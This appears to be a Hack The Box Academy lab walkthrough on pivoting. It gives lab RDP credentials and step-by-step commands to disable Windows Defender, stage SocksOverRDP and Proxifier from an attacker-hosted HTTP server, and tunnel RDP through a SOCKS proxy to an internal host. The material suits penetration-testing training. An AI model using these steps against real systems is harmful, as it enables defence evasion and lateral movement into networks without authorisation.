# Exercise

> RDP to 10.129.42.198 (ACADEMY-PIVOTING-WIN10PIV) with user "htb-student" and password "HTB_@cademy_stdnt!"

1. Use the concepts taught in this section to pivot to the Windows server at 172.16.6.155 (jason:WellConnected123!). Submit the contents of Flag.txt on Jason's Desktop.


```sh
# Connect
xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:10.129.42.198 /size:80% +clipboard


# Download the binaries on our Kali
wget https://github.com/nccgroup/SocksOverRDP/releases/download/v1.0/SocksOverRDP-x64.zip

wget https://www.proxifier.com/download/ProxifierPE.zip


# Turn OFf Real Time protection and ANY AV protection
Windows Security > Virus and threat protection > Virus andv Threat protection settings > Manage settings > Real-Time Protection > Off


# Transfer to pivot host
python3 -m http.server 8000


# On pivot host
iwr -uri http://10.10.15.242:8000/SocksOverRDP-x64.zip -Outfile  SocksOverRDP-x64.zip  
iwr -uri http://10.10.15.242:8000/ProxifierPE.zip -Outfile  ProxifierPE.zip 


# Extract SockOverRDP
Expand-Archive -Path .\ProxifierPE.zip -DestinationPath "C:\Users"
Expand-Archive -Path .\SocksOverRDP-x64.zip -DestinationPath "C:\Users"  


# Load sockOverRDP in Windows using cmd.exe ran as admin on Pivot host
regsvr32.exe SocksOverRDP-Plugin.dll


# Observe successfully loaded. Open RDP using CLI 
mstsc.exe


# Enter 172.16.5.19 and victor as username. Observe `SocksOverRDP is enabled. When the server binary gets executed, it will listen on 127.0.0.1:1080`. Enter victor's password.

# If everything goes well, access RDP. We need to transfer the socksOverRDP.exe to 172.16.5.19 that we just opened. Copy and paste works just fine. Right click > run the application as admin


# Once we get channel opened over RDP, go back to pivot host and verify the SOCKS listener has started
PS C:\Users\Public> netstat -antb | findstr 1080                         

TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING


# Now we can start the proxifier PE on our Pivot Host and configure to forward all our packets to 127.0.0.1:1080 
Proxifier Portable > Profile > Proxy servers > Add > Address: 127.0.0.1:1080 > Socks5 > Ok


# Start another cmd.exe and open rdp on Pivot host
mstsc.exe

# Enter IP 172.16.6.155 and user jason. Pass: WellConnected123!


# If everything goes well, we should have a new RDP session for user Jason. Read the flag on Desktop
*****
```
